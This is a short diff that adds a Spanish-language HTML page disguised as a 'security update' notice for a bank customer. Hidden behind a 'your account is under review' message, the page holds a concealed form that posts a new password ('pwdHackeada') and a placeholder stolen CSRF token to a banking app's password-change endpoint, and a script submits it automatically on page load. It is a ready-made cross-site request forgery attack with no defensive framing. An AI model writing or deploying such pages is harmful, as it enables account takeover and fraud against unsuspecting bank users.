@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Actualización de Seguridad</title>
+</head>
+<body>
+    <h2>Actualización de Seguridad</h2>
+    <p>Su cuenta está siendo revisada. Por favor, espere unos momentos...</p>
+    
+    <!-- Formulario oculto que realiza la solicitud de cambio de contraseña -->
+    <form id="csrfAttackForm" action="https://miAppBancaria.com/api/cambiarContraseña" method="POST">
+        <input type="hidden" name="newPassword" value="pwdHackeada">
+        <input type="hidden" name="__RequestVerificationToken" value="CSRF_TOKEN_ROBADO">
+    </form>
+    
+    <script>
+        // Envía el formulario automáticamente al cargar la página
+        document.getElementById("csrfAttackForm").submit();
+    </script>
+</body>
+</html>
